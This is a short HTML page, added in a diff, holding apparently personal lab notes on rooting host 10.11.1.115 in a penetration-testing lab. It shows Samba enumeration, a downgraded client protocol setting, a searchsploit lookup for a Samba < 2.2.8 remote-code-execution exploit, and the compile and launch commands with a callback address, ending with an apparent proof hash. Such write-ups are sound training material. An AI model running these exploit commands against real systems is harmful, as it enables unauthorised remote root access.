@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.11.1.115 Tophat rooted</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.11.1.115 Tophat rooted</h1><br/>nmap showed that an assload of ports were open.<br />Smb enum things were acting wierd so after one mile of troubleshooting I Determined that I needed to add a line to /etc/samba/smb.conf<br />    in the global setction add the line...<br />    client min protocol = LANMAN1<br />    toggled the smbd service and reran SMB enum scripts... Success!! We determined that the service is Samba 2.2.7<br /><br />searchsploit showed me that the there was a RCE exploit for anything less than &lt; Samba 2.2.8<br />Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution | exploits/multiple/remote/10.c<br />gcc 10.c 10.exe      to compile the exploit<br />./10.exe -b 0 -c 192.168.119.167 -p 139 -f 10.11.1.115<br />rooted!<br /><br />takeaways, /etc/samba/smb.conf NEEDS to have the LANMAN1 line added. Like, I that needs to be in the TireFire2.0 BuildScript!<br /><br /><br /><br /><br />377bbe9add593ba528fd9bd3104d2f25</div></body></html>
